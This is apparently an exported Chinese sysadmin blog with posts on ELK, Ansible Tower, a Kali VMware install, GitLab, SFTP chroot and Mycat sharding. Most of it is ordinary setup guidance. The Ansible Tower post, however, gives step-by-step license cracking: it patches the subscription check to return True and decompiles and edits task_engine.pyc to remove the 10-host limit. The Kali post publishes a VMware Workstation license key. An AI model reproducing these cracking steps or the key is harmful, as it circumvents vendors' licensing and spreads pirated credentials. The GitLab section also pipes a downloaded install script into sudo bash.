：可以把output中的elasticsearch，注释掉，启动java程序测试下logstash控制台中是否输出日志，调试启动./bin/logstash -f log4j.cfg 0x03 配置elasticsearchroot直接启动 elasticsearch 报错如下 123456789101112131415[2017-09-18T08:51:35,959][WARN ][o.e.b.ElasticsearchUncaughtExceptionHandler] [] uncaught exception in thread [main]org.elasticsearch.bootstrap.StartupException: java.lang.RuntimeException: can not run elasticsearch as root at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:136) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:123) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:67) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:91) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:84) ~[elasticsearch-5.6.0.jar:5.6.0]Caused by: java.lang.RuntimeException: can not run elasticsearch as root at org.elasticsearch.bootstrap.Bootstrap.initializeNatives(Bootstrap.java:106) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:195) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:342) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:132) ~[elasticsearch-5.6.0.jar:5.6.0] ... 6 more elasticsearch不允许root用户运行，首先创建普通用户，设置权限 123useradd elkchown -R elk:elk ./elasticsearch-5.6.0 配置文件config/elasticsearch.yml第55行和59行是监听地址和端口，config/jvm.optionsjvm内存配置文件，根据需求配置 切换到普通用户elk启动elasticsearch 1234su - elkcd /data/elk/elasticsearch-5.6.0./bin/elasticsearch -d#-d选项后台运行 0x04 配置nginx加固kibana安全12345678910111213141516171819server &#123; listen 8000; server_name localhost; auth_basic "ELK Log Auth"; #密码文件 auth_basic_user_file /data/nginx/kibana.passwd; #配置ssl ssl on; ssl_certificate /data/nginx/all.crt; ssl_certificate_key /data/nginx/server.key; location / &#123; proxy_pass http://127.0.0.1:5601; proxy_redirect off; &#125;&#125; 1. 生成nginx认证文件如果提示没用htpasswd就装个apache,根据提示输入两次密码就ok 1234htpasswd -c /data/nginx/kibana.passwd username#&gt; New password: #&gt; Re-type new password: #&gt; Adding password for user username 2. 生成ssl证书12345openssl genrsa -des3 -out server.key 1024openssl rsa -in server.key -out server1.keyopenssl req -new -key server1.key -out all.csr#会提示让输入各种信息，最后会让输入密码，如果设置启动nginx会让输入密码。openssl x509 -req -days 365 -in all.csr -signkey server1.key -out all.crt 3. 启动nginx1./sbin/nginx 0x05 启动elk使用screen 启动kibana、logstash 启动logstash： 1234567891011121314151617#创建名为logstash的screen后台进程screen -dmS logstash#查看screen进程screen -lsThere are screens on: 19654.logstash (Detached)#进入会话screen -r logstash#启动logstashcd /data/elk/logstash-5.0.1./bin/logstash -f log4j.cfg#后台运行Ctrl + a d 启动kibana： 12345screen -dmS kibanascreen -r kibanacd /data/elk/kibana-5.6.0-linux-x86_64./bin/kibanaCtrl + a + d kibana添加索引game-（在logstash配置文件中） 自定义Visualize，显示到dashboard 0x06 这只是开始。。。。进门摸爬滚打]]></content>
      <categories>
        <category>ELK</category>
        <category>自动化运维</category>
      </categories>
      <tags>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ansible-Tower部署and破解]]></title>
    <url>%2F2017%2F07%2F24%2Flinux-tower%2F</url>
    <content type="text"><![CDATA[ansibke-tower他是一个图形化的任务调度，复杂服务部署，IT自动化的一个管理平台。可以通过界面从github拉取最新playbook实施服务部署，提高生产效率。当然，它也提供一个RESET API和命令行的CLI以供python脚本调用。 0x00 前言ansible-tower关于此类的文章比较少，踩过坑，16年那会儿有听过就装上研究了一发，现在做个迟来的笔记， 包括部署，和免费版10台机器限制的破解。 支持的操作系统： Red Hat Enterprise Linux 7.2 or later 64-bit CentOS 7.2 or later 64-bit Ubuntu 14.04 LTS 64-bit Ubuntu 16.04 LTS 64-bit 推荐最低内存为2GB。 0x01 安装整个申请流程也是麻烦的很，尤其是申请免费license。这里直接给出官网下载链接Ansible-Tower 这里使用的是最新版(3.1.4) 1234567wget http://releases.ansible.com/ansible-tower/setup/ansible-tower-setup-latest.tar.gz -P /data/tower/cd /data/tower/tar xvf ansible-tower-setup-latest.tar.gz -C ./cd ansible-tower-setup-3.1.4/ 目录结构，安装非常简单，这也要得益于ansible的playbook。 123456789101112[root@ad0e6b9ef8d5 ansible-tower-setup-3.1.4]# lltotal 60-rw-r--r--. 1 root root 2526 Jul 10 13:59 README.md-rw-r--r--. 1 root root 129 Jul 10 13:59 backup.ymldrwxr-xr-x. 2 root root 4096 Jul 10 13:59 group_vars-rw-r--r--. 1 root root 10 Jul 25 03:03 install.retry-rw-r--r--. 1 root root 5571 Jul 10 13:59 install.yml-rw-r--r--. 1 root root 379 Jul 25 03:03 inventorydrwxr-xr-x. 2 root root 12288 Jul 10 13:59 licenses-rw-r--r--. 1 root root 944 Jul 10 13:59 restore.ymldrwxr-xr-x. 18 root root 4096 Jul 10 13:59 roles-rwxr-xr-x. 1 root root 9628 Jul 10 13:59 setup.sh 编辑inventory配置文件如下 vim inventory 123456789101112131415161718192021222324252627[tower]localhost ansible_connection=local[database][all:vars]#ansible-tower登录密码admin_password='admin'#PostgreSQL监听地址端口pg_host='127.0.0.1'pg_port='5432'pg_database='awx'pg_username='awx'#herepg_password='awx'rabbitmq_port=5672rabbitmq_vhost=towerrabbitmq_username=tower#hererabbitmq_password='tower'rabbitmq_cookie=cookiemonster# Needs to be true for fqdns and ip addressesrabbitmq_use_long_name=false 运行安装脚本 1sh setup.sh 脚本会自动安装，熟悉的执行playbook任务界面。 安装成功 1localhost : ok=41 changed=5 unreachable=0 failed=0 0x02导入license文件访问tower：https://192.168.99.188/，默认用户名为admin密码为inventory文件中设置的admin_password=&#39;admin&#39; 重点来了，这里会提示让选择license文件，申请这个很是麻烦，so这里分享下我自己申请下来的license文件直接导入就ok。仅供实验测试使用，请勿用于其它用途！。 注意从3.2.x版本开始ansible-tower破解方式更改，无需申请license文件 更改文件/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.py第120行如下 119 def _check_cloudforms_subscription(self):120 return True121 if os.path.isdir("/opt/rh/cfme-appliance") and os.path.isdir("/opt/rh/cfme-gemset"):122 try:123 has_rpms = subprocess.call(["rpm", "--quiet", "-q", "cfme", "cfme-appliance", "cfme-gemset"])124 if has_rpms == 0:125 return True126 except OSError:127 pass128 return False 0x03 破解10个hosts限制申请的免费版license最多只能添加10个主机。 1HOSTS AVAILABLE 10 首先下载python反编译工具 1pip install uncompyle2 反编译文件task_engine.pyc 123456789#查找文件root@2813e2635181:~# find / -name task_engine.pyc/usr/lib/python2.7/dist-packages/awx/main/task_engine.pyccd /usr/lib/python2.7/dist-packages/awx/main/#反编译文件uncompyle6 task_engine.pyc &gt;task_engine.py 更改task_engine.pyc文件 修改内容 available_instances = int(self.attributes[&#39;instance_count&#39;])为available_instances = 10000，大约在162行 删除task_engine.pyc task_engine.pyo，重启tower 0x04至此安装破解都已完成。简单的试用了下，很方便，通过git来获取更新任务playbook文件，图形化配置playbook参数，任务审计记录。结合ansible进行主机管理，服务部署，很方便。写了个zookeeper集群部署的playbook deploy_zk。:P]]></content>
      <categories>
        <category>自动化运维</category>
        <category>Ansible</category>
      </categories>
      <tags>
        <tag>Ansible</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux 2017.1 安装vmware 报错]]></title>
    <url>%2F2017%2F07%2F07%2Fkali-vmware%2F</url>
    <content type="text"><![CDATA[0x00 阳光普照官网下载地址：VMware-Workstation for linux Key：VF5XA-FNDDJ-085GZ-4NXZ9-N20E6 0x01 问题安装了Kali Linux 2017.1， 熟悉的老司机姿势安装Vmware 安装内核头文件 123apt-get update &amp;&amp; apt-get dist-upgradeapt-get install linux-headers-$(uname -r) 然后竟然翻车了 12345678root@***REMOVED***:~# apt-get install linux-headers-$(uname -r)Reading package lists... DoneBuilding dependency tree Reading state information... DoneE: Unable to locate package linux-headers-4.9.0-kali3-amd64E: Couldn't find any package by glob 'linux-headers-4.9.0-kali3-amd64'E: Couldn't find any package by regex 'linux-headers-4.9.0-kali3-amd64' 搜索内核头安装包apt search linux-headers 12linux-headers-4.9.0-kali4-all-amd64/kali-rolling 4.9.30-2kali1 amd64 All header files for Linux 4.9 (meta-package) 只有kali4没kali3 0x02 解决1234567891011apt-get install linux-headers-amd64#执行后重启机器rebootroot@***REMOVED***:~# uname -r# 4.9.0-kali4-amd64apt-get install linux-headers-$(uname -r) OK 解决]]></content>
      <categories>
        <category>ErrorNote</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[GitLab 9.2.6 安装及汉化]]></title>
    <url>%2F2017%2F06%2F21%2Flinux-gitlab%2F</url>
    <content type="text"><![CDATA[GitLab 官方新版(9.2.6)安装及汉化 0x00 安装GitLab测试主机: CentOS Linux release 7.3.1611 (Core)其它系统参考: GitLab安装 安装和配置必要的依赖关系123456789sudo yum install curl policycoreutils openssh-server openssh-clientssudo systemctl enable sshdsudo systemctl start sshdsudo yum install postfixsudo systemctl enable postfixsudo systemctl start postfixsudo firewall-cmd --permanent --add-service=httpsudo systemctl reload firewalld 添加GitLab服务包并安装12curl -sS https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bashsudo yum install gitlab-ce 配置并启动GitLab123456vim +13 /etc/gitlab/gitlab.rb# 修改external_url 'http://172.16.0.123'为内网ip或绑定的域名# 此处的地址生效在项目url地址处sudo gitlab-ctl reconfigure# 启动服务 查看123456789101112Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:9100 0.0.0.0:* LISTEN 25658/node_exporter tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN 25718/unicorn maste tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 25650/nginx: master tcp 0 0 127.0.0.1:9168 0.0.0.0:* LISTEN 25631/ruby tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1439/master tcp 0 0 0.0.0.0:8060 0.0.0.0:* LISTEN 25650/nginx: master tcp 0 0 127.0.0.1:9121 0.0.0.0:* LISTEN 25692/redis_exporte tcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN 25678/prometheus tcp 0 0 127.0.0.1:9187 0.0.0.0:* LISTEN 25664/postgres_expo tcp6 0 0 ::1:9168 :::* LISTEN 25631/ruby tcp6 0 0 ::1:25 :::* LISTEN 1439/master 访问 http://172.16.0.123 初始化密码 默认用户名为 root 0x01 汉化查看当前GitLab版本12sudo cat /opt/gitlab/embedded/service/gitlab-rails/VERSION# 9.2.6 clone汉化代码1234567mkdir -p /opt/gitlab-zh cd /opt/gitlab-zhyum -y install gitgit clone https://gitlab.com/xhang/gitlab.git 比较汉化分支和原分支导出文件123456cd gitlabgit diff origin/9-2-stable 9-2-stable-zh &gt; /opt/gitlab-zh/9.2.diff# 此处是9.2.6版本 其他版本只需更改数字 例如为9.1 : # git diff origin/9-1-stable 9-1-stable-zh &gt; /opt/gitlab-zh/9.1.diff 打补丁(9.2.diff)1234567891011cd /opt/gitlab-zhyum -y install patchgitlab-ctl stop#停止gitlabpatch -d /opt/gitlab/embedded/service/gitlab-rails -p1 &lt; /opt/gitlab-zh/9.2.diffgotlab-ctl start#启动gitlab 0x02 管理运维管理1234567891011# 启动所有 gitlab 组件：sudo gitlab-ctl start# 停止所有 gitlab 组件：sudo gitlab-ctl stop# 重启所有 gitlab 组件：sudo gitlab-ctl restart# 更新配置并重启sudo gitlab-ctl reconfigure 备份恢复备份 crontab 中添加 10 1 * * * /usr/bin/gitlab-rake gitlab:backup:create 恢复 首先进入备份 gitlab 的目录，这个目录是配置文件中的gitlab_rails[&#39;backup_path&#39;]，默认为/var/opt/gitlab/backups。 然后停止 unicorn 和 sidekiq ，保证数据库没有新的连接，不会有写数据情况。 12345sudo gitlab-ctl stop unicorn# ok: down: unicorn: 0s, normally upsudo gitlab-ctl stop sidekiq# ok: down: sidekiq: 0s, normally up 然后恢复数据，1498033332为备份文件的时间戳 1234ls /var/opt/gitlab/backups#1498033332_2017_06_21_9.2.6_gitlab_backup.targitlab-rake gitlab:backup:restore BACKUP=1498033332 数据储存默认情况下，gitlab 将数据存储在/var/opt/gitlab/git-data目录下，受限于分区情况&amp;方便管理，我们可以将数据迁移到别的目录下。 没有投入使用可直接更改 1234567vim /etc/gitlab/gitlab.rb#添加git_data_dir "/path/to/git-data"# 更新配置并重启sudo gitlab-ctl reconfigure 数据迁移首先需要暂停服务，避免用户在迁移期间读写数据： 1234567gitlab-ctl stoprsync -av /var/opt/gitlab/git-data/repositories /path/to/git-data/sudo gitlab-ctl startsudo gitlab-ctl reconfigure]]></content>
      <categories>
        <category>GitLab</category>
      </categories>
      <tags>
        <tag>GitLab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sftp锁定用户根目录配置详解]]></title>
    <url>%2F2017%2F05%2F17%2Flinux-sftp%2F</url>
    <content type="text"><![CDATA[SFTP，即 SSH 文件传输协议，或者说是安全文件传输协议, 通过SSH端口加密传输。但是，由于这种传输方式使用了加密/解密技术，所以传输效率比普通的FTP要低得多。SFTP的优势在于SSH软件包中包含SFTP（无需额外安装），iptables无需添加额外端口，配置方便 0x00 添加用户在默认情况下， SFTP 使用 SSH 协议进行身份验证并建立安全连接,所以直接使用命令添加账户。 添加组1groupadd sftp 再添加账户123useradd -g sftp -M -N -s /sbin/nologin user#添加username用户并且禁止此用户login系统 查询用户是否添加到组123[root@Centos6-8-TestEnv data]# groups useruser : sftp 设置密码12345[root@Centos6-8-TestEnv data]# passwd user更改用户 user 的密码 。新的 密码：重新输入新的 密码：passwd： 所有的身份验证令牌已经成功更新。 0x01 修改sshd_config配置文件编辑配置文件：/etc/ssh/sshd_config修改Subsystem sftp /usr/libexec/openssh/sftp-server为Subsystem sftp internal-sftp 以下是对sftp组权限配置 123456789#匹配 sftp 组的用户Match Group sftp #锁定的目录 ChrootDirectory /data/test #指定使用sftp服务使用系统自带的internal-sftp ForceCommand internal-sftp #如果不希望该用户能使用端口转发就加上，否则删掉 AllowTcpForwarding no X11Forwarding no 或者对user用户权限配置 12345678#匹配 user 用户Match User user #ChrootDirectory %u (%u代表变量用户名) ChrootDirectory /data/test ForceCommand internal-sftp AllowTcpForwarding no PermitTunnel no X11Forwarding no 修改锁定用户目录的权限1234#所有者设置为了root，所有组设置为sftpchown root:sftp /data/test#权限设置为755，所有者root有写入权限，而所有组sftp无写入权限chmod -R 755 /data/test 目录的权限设定有两个要点：1、由ChrootDirectory指定的目录开始一直往上到系统根目录为止的目录拥有者都只能是root2、由ChrootDirectory指定的目录开始一直往上到系统根目录为止都不可以具有群组写入权限（最大权限为755） 添加上传目录1234mkdir /data/test/uploadchown user:sftp /data/test/upload#允许user用户有读写权限，群组外用户无写入权限chmod 755 /data/test/upload 12#重启SSHD使配置生效service sshd restart 0x02 使用xftp测试连接]]></content>
      <categories>
        <category>SSH</category>
        <category>sftp</category>
      </categories>
      <tags>
        <tag>sftp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mycat分片规则]]></title>
    <url>%2F2017%2F05%2F07%2Fmycat-alg%2F</url>
    <content type="text"><![CDATA[常用的根据主键或非主键的分片规则配置 1. 枚举法： 通过在配置文件中配置可能的枚举id，自己配置分片，使用规则： 12345678910111213141516&lt;tableRule name="sharding-by-intfile"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;hash-int&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="hash-int" class="org.opencloudb.route.function.PartitionByFileMap"&gt; &lt;!--标识配置文件名称--&gt; &lt;property name="mapFile"&gt;partition-hash-int.txt&lt;/property&gt; &lt;!--type默认值为0，0表示Integer，非零表示String--&gt; &lt;property name="type"&gt;0&lt;/property&gt; &lt;!--所有的节点配置都是从0开始，及0代表节点1--&gt; &lt;property name="defaultNode"&gt;0&lt;/property&gt;&lt;/function&gt; partition-hash-int.txt 配置： 12310000=010010=1DEFAULT_NODE=1 defaultNode 默认节点:小于0表示不设置默认节点，大于等于0表示设置默认节点 默认节点的作用：枚举分片时，如果碰到不识别的枚举值，就让它路由到默认节点如果不配置默认节点（defaultNode值小于0表示不配置默认节点），碰到不识别的枚举值就会报错， like this：can&#39;t find datanode for sharding column:column_name val:ffffffff 2.固定分片hash算法12345678910111213141516&lt;tableRule name="rule1"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;func1&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="func1" class="org.opencloudb.route.function.PartitionByLong"&gt; &lt;!--分片个数列表--&gt; &lt;property name="partitionCount"&gt;2,1&lt;/property&gt; &lt;!--分片范围列表--&gt; &lt;property name="partitionLength"&gt;256,512&lt;/property&gt; &lt;!--分区长度:默认为最大2^n=1024 ,即最大支持1024分区--&gt;&lt;/function&gt; 约束 : 123count,length两个数组的长度必须是一致的。1024 = sum((count[i]*length[i])). count和length两个向量的点积恒等于1024 用法例子： 123456789101112131415161718192021222324252627 本例的分区策略：希望将数据水平分成3份，前两份各占25%，第三份占50%。（故本例非均匀分区） // |&lt;---------------------1024------------------------&gt;| // |&lt;----256---&gt;|&lt;----256---&gt;|&lt;----------512----------&gt;| // | partition0 | partition1 | partition2 | // | 共2份,故count[0]=2 | 共1份，故count[1]=1 | int[] count = new int[] &#123; 2, 1 &#125;; int[] length = new int[] &#123; 256, 512 &#125;; PartitionUtil pu = new PartitionUtil(count, length); // 下面代码演示分别以offerId字段或memberId字段根据上述分区策略拆分的分配结果 int DEFAULT_STR_HEAD_LEN = 8; // cobar默认会配置为此值 long offerId = 12345; String memberId = "qiushuo"; // 若根据offerId分配，partNo1将等于0，即按照上述分区策略，offerId为12345时将会被分配到partition0中 int partNo1 = pu.partition(offerId); // 若根据memberId分配，partNo2将等于2，即按照上述分区策略，memberId为qiushuo时将会被分到partition2中 int partNo2 = pu.partition(memberId, 0, DEFAULT_STR_HEAD_LEN);如果需要平均分配设置：平均分为4分片，partitionCount*partitionLength=1024&lt;function name="func1" class="org.opencloudb.route.function.PartitionByLong"&gt; &lt;property name="partitionCount"&gt;4&lt;/property&gt; &lt;property name="partitionLength"&gt;256&lt;/property&gt;&lt;/function&gt; 3.范围约定123456789101112&lt;tableRule name="auto-sharding-long"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;rang-long&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="rang-long" class="org.opencloudb.route.function.AutoPartitionByLong"&gt; &lt;!--配置文件路径--&gt; &lt;property name="mapFile"&gt;autopartition-long.txt&lt;/property&gt;&lt;/function&gt; autopartition-long.txt： 123456789# range start-end ,data node index# 所有的节点配置都是从0开始，及0代表节点1，此配置非常简单，即预先制定可能的id范围到某个分片# K=1000,M=10000.0-500M=0500M-1000M=11000M-1500M=2或0-10000000=010000001-20000000=1 4.求模法123456789101112&lt;tableRule name="mod-long"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;mod-long&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="mod-long" class="org.opencloudb.route.function.PartitionByMod"&gt; &lt;!--注意！这里填写数据库节点数，否则无法分片--&gt; &lt;property name="count"&gt;3&lt;/property&gt;&lt;/function&gt; 此种配置非常明确即根据id进行十进制求模预算，相比方式1，此种在批量插入时需要切换数据源，id不连续 5.日期列分区法12345678910111213&lt;tableRule name="sharding-by-date"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;create_time&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;sharding-by-date&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt; &lt;function name="sharding-by-date" class="org.opencloudb.route.function.PartitionByDate"&gt; &lt;property name="dateFormat"&gt;yyyy-MM-dd&lt;/property&gt; &lt;property name="sBeginDate"&gt;2015-01-01&lt;/property&gt; &lt;property name="sPartionDay"&gt;10&lt;/property&gt;&lt;/function&gt; 配置中配置了开始日期，分区天数，即默认从开始日期算起，分隔10天一个分区 1234Assert.assertEquals(true, 0 == partition.calculate("2015-01-01"));Assert.assertEquals(true, 0 == partition.calculate("2015-01-10"));Assert.assertEquals(true, 1 == partition.calculate("2015-01-11"));Assert.assertEquals(true, 12 == partition.calculate("2015-05-01")); 6.通配取模1234567891011121314151617&lt;tableRule name="sharding-by-pattern"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;sharding-by-pattern&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="sharding-by-pattern" class="org.opencloudb.route.function.PartitionByPattern"&gt; &lt;!--求模基数--&gt; &lt;property name="patternValue"&gt;256&lt;/property&gt; &lt;!--默认节点--&gt; &lt;!--如果配置了默认，则不会按照求模运算--&gt; &lt;property name="defaultNode"&gt;2&lt;/property&gt; &lt;!-- 配置文件路径--&gt; &lt;property name="mapFile"&gt;partition-pattern.txt&lt;/property&gt;&lt;/function&gt; partition-pattern.txt ： 1234567891011121314# id partition range start-end ,data node index###### first host configuration1-32=033-64=165-96=297-128=3######## second host configuration129-160=4161-192=5193-224=6225-256=70-0=7#1-32 即代表id%256后分布的范围，如果在1-32则在分区1，其他类推，如果id非数据，则会分配在defaoultNode 默认节点 7. ASCII码求模通配12345678910111213141516&lt;tableRule name="sharding-by-prefixpattern"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;sharding-by-prefixpattern&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="sharding-by-pattern" class="org.opencloudb.route.function.PartitionByPattern"&gt; &lt;!--求模基数--&gt; &lt;property name="patternValue"&gt;256&lt;/property&gt; &lt;!--ASCII 截取的位数--&gt; &lt;property name="prefixLength"&gt;5&lt;/property&gt; &lt;!-- 配置文件路径--&gt; &lt;property name="mapFile"&gt;partition-pattern.txt&lt;/property&gt;&lt;/function&gt; partition-pattern.txt： 1234567891011121314151617# range start-end ,data node index# ASCII# 48-57=0-9# 64、65-90=@、A-Z# 97-122=a-z###### first host configuration1-4=05-8=19-12=213-16=3###### second host configuration17-20=421-24=525-28=629-32=70-0=7#1-32 即代表id%256后分布的范围，如果在1-32则在分区1，其他类推 此种方式类似方式6只不过采取的是将列种获取前prefixLength位列所有ASCII码的和进行求模sum%patternValue ,获取的值，在通配范围内的即 分片数， ASCII编码：48-57=0-9阿拉伯数字64、65-90=@、A-Z97-122=a-z 例如： 12345678String idVal="gf89f9a";Assert.assertEquals(true, 0==autoPartition.calculate(idVal));idVal="8df99a";Assert.assertEquals(true, 4==autoPartition.calculate(idVal));idVal="8dhdf99a";Assert.assertEquals(true, 3==autoPartition.calculate(idVal)); 8.编程指定1234567891011121314&lt;tableRule name="sharding-by-substring"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;sharding-by-substring&lt;/algorithm&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;function name="sharding-by-substring" class="org.opencloudb.route.function.PartitionDirectBySubString"&gt; &lt;property name="startIndex"&gt;0&lt;/property&gt; &lt;!-- zero-based --&gt; &lt;property name="size"&gt;2&lt;/property&gt; &lt;property name="partitionCount"&gt;8&lt;/property&gt; &lt;property name="defaultPartition"&gt;0&lt;/property&gt;&lt;/function&gt; 此方法为直接根据字符子串（必须是数字）计算分区号（由应用传递参数，显式指定分区号）。例如id=05-100000002在此配置中代表根据id中从startIndex=0，开始，截取siz=2位数字即05，05就是获取的分区，如果没传默认分配到defaultPartition 9.字符串拆分hash解析12345678910111213141516&lt;tableRule name="sharding-by-stringhash"&gt; &lt;rule&gt; &lt;!--标识将要分片的表字段--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--分片函数--&gt; &lt;algorithm&gt;sharding-by-stringhash&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="sharding-by-substring" class="org.opencloudb.route.function.PartitionDirectBySubString"&gt; &lt;!--字符串hash求模基数--&gt; &lt;property name=length&gt;512&lt;/property&gt; &lt;!-- zero-based --&gt; &lt;!--分区数--&gt; &lt;property name="count"&gt;2&lt;/property&gt; &lt;!--预算位--&gt; &lt;property name="hashSlice"&gt;0:2&lt;/property&gt;&lt;/function&gt; hashSlice ： 0 means str.length(), -1 means str.length()-1 123456&gt; "2" -&amp;gt; (0,2)&lt;br/&gt;&gt; "1:2" -&amp;gt; (1,2)&lt;br/&gt;&gt; "1:" -&amp;gt; (1,0)&lt;br/&gt;&gt; "-1:" -&amp;gt; (-1,0)&lt;br/&gt;&gt; ":-1" -&amp;gt; (0,-1)&lt;br/&gt;&gt; ":" -&amp;gt; (0,0)&lt;br/&gt; 例子： 1234567891011121314151617181920212223String idVal=null; rule.setPartitionLength("512"); rule.setPartitionCount("2"); rule.init(); rule.setHashSlice("0:2");// idVal = "0";// Assert.assertEquals(true, 0 == rule.calculate(idVal));// idVal = "45a";// Assert.assertEquals(true, 1 == rule.calculate(idVal)); //last 4rule = new PartitionByString();rule.setPartitionLength("512");rule.setPartitionCount("2");rule.init();//last 4 charactersrule.setHashSlice("-4:0");idVal = "aaaabbb0000";Assert.assertEquals(true, 0 == rule.calculate(idVal));idVal = "aaaabbb2359";Assert.assertEquals(true, 0 == rule.calculate(idVal)); 10. 一致性hash1234567891011121314151617&lt;tableRule name="sharding-by-murmur"&gt; &lt;rule&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;algorithm&gt;murmur&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="murmur" class="org.opencloudb.route.function.PartitionByMurmurHash"&gt; &lt;property name="seed"&gt;0&lt;/property&gt;&lt;!-- 默认是0--&gt; &lt;property name="count"&gt;2&lt;/property&gt;&lt;!-- 要分片的数据库节点数量，必须指定，否则没法分片--&gt; &lt;property name="virtualBucketTimes"&gt;160&lt;/property&gt;&lt;!-- 一个实际的数据库节点被映射为这么多虚拟节点，默认是160倍，也就是虚拟节点数是物理节点数的160倍--&gt; &lt;!-- &lt;property name="weightMapFile"&gt;weightMapFile&lt;/property&gt; 节点的权重，没有指定权重的节点默认是1。以properties文件的格式填写，以从0开始到count-1的整数值也就是节点索引为key，以节点权重值为值。所有权重值必须是正整数，否则以1代替 --&gt; &lt;!-- &lt;property name="bucketMapPath"&gt;/etc/mycat/bucketMapPath&lt;/property&gt; 用于测试时观察各物理节点与虚拟节点的分布情况，如果指定了这个属性，会把虚拟节点的murmur hash值与物理节点的映射按行输出到这个文件，没有默认值，如果不指定，就不会输出任何东西 --&gt;&lt;/function&gt; 一致性hash预算有效解决了分布式数据的扩容问题，前1-9中id规则都多少存在数据扩容难题，而10规则解决了数据扩容难点]]></content>
      <categories>
        <category>数据库</category>
        <category>Mycat</category>
      </categories>
      <tags>
        <tag>Mycat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mycat分库分表]]></title>
    <url>%2F2017%2F05%2F07%2Fmysql-mycat%2F</url>
    <content type="text"><![CDATA[0x00 数据切分 简单来说，就是指通过某种特定的条件，将我们存放在同一个数据库中的数据分散存放到多个数据库（主机）上面，以达到分散单台设备负载的效果，即分库分表。 数据的切分根据其切分规则的类型，可以分为两种切分模式： 123垂直（纵向）切分： 按照不同的表（或者Schema）来切分到不同的数据库（主机）之上；水平（横向）切分： 根据表中的数据的逻辑关系，将同一个表中的数据按照某种条件拆分到多台数据库（主机）上面。 1. 垂直切分 一个数据库由多个表构成，每个表对应着不同的业务，垂直切分是指按照业务将表进行分类，分布到不同的数据库上面，这样也就将数据或者说压力分担到不同的库上面（专库专用）。例： 12345#有如下几张表--------------+--------------+------------------用户信息(user)+ 交易记录(pay)+ 商品(commodity)|--------------+--------------+------------------ 垂直切分根据每个表的不同业务进行切割，user表，pay表，commodity表，每个表切分到不同的数据库上。 优点： 拆分后业务清晰，拆分规则明确。 系统之间整合或扩展容易。 数据维护简单。 缺点： 部分业务表无法 join，只能通过接口方式解决，提高了系统复杂度。 受每种业务不同的限制存在单库性能瓶颈，不易数据扩展跟性能提高。 事务处理复杂。 2. 水平切分 相对于垂直拆分，水平拆分不是将表做分类，而是按照某个字段的某种规则来分散到多个库之中，每个表中包含一部分数据。简单来说，我们可以将数据的水平切分理解为是按照数据行的切分，就是将表中的某些行切分到一个数据库，而另外的某些行又切分到其他的数据库中，如图： 优点： 拆分规则抽象好，join 